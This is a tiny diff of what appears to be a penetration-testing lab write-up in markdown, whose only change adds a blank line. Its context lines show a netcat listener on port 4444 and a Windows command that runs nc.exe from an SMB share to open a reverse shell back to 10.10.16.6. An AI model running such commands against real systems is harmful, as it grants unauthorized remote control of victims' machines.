@@ -66,6 +66,7 @@ rlwrap -cAr nc -nlvp 4444
 ```cmd
 \\10.10.16.6\smbFolder\nc.exe -e cmd 10.10.16.6 4444
 ```
+
 >[!example]- Result
 ![[Pasted image 20250305111718.png]]
 ![[Pasted image 20250305111747.png]]
